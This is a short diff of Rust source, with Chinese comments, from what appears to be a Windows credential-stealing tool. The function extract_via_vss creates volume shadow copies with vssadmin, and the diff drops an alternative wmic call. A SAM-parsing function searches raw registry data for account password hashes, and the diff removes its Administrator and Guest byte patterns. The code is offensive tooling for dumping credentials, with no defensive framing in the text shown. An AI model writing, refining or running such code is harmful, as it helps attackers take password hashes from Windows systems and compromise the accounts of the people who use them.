@@ -92,12 +92,6 @@ fn extract_via_vss() -> Result<Vec<Credential>, String> {
     let temp_dir = std::env::temp_dir();
 
     // 创建卷影副本
-    let vss_output = std::process::Command::new("wmic")
-        .args(["shadowcopy", "call", "create", "Volume=C:\\"])
-        .output()
-        .map_err(|_| String::from("WMIC不可用"))?;
-
-    // 另一种方式：使用vssadmin
     let vssadmin_output = std::process::Command::new("vssadmin")
         .args(["create", "shadow", "/for=C:"])
         .output()
@@ -197,13 +191,6 @@ fn parse_sam_registry_hashes(data: &[u8]) -> Result<Vec<Credential>, String> {
 
     // 简单的启发式搜索：
     // 寻找"Administrator"或"Guest"字符串来定位用户条目
-
-    let admin_bytes: Vec<u8> = "Administrator".encode_utf16()
-        .flat_map(|c| c.to_le_bytes())
-        .collect();
-    let guest_bytes: Vec<u8> = "Guest".encode_utf16()
-        .flat_map(|c| c.to_le_bytes())
-        .collect();
 
     // 已知默认用户
     let known_users = vec![
